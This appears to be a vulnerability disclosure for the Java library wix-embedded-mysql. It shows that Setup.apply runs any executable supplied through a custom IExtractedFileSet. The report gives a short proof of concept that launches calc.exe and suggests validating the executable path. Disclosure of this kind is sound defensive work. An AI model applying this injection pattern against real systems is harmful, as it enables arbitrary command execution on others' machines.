# Code injection Vulnerability in com.wix:wix-embedded-mysql:4.6.1

**Affected Version**
The latest version 4.6.2 and below.

**Affected Components**

```
wix-embedded-mysql/src/main/java/com/wix/mysql/distribution/Setup.java
```

**Describe the Vulnerability**
There is a method, `com.wix.mysql.distribution.Setup.apply`, designed to setup Mysql. However, passing an unchecked argument to this API can lead to the execution of arbitrary commands. For instance, following codes can lead to the execution of arbitrary commands from attackers:

```java
        IExtractedFileSet set = new IExtractedFileSet() {
            @Override
            public File executable() {
                return new File("C:/Windows/System32/calc.exe");
            }

            @Override
            public List<File> files(FileType fileType) {
                return null;
            }

            @Override
            public File baseDir() {
                return null;
            }

            @Override
            public boolean baseDirIsGenerated() {
                return false;
            }
        };
        MysqldConfig.Builder builder = MysqldConfig.aMysqldConfig(Version.v5_7_10);
        Setup.apply(builder.build(), set, null);
```

**To Reproduce**
Just execute above codes will reproduce it.

**Fix Suggestion**
Strictly check whether `IExtractedFileSet.executable()` returns the path of Mysql executable.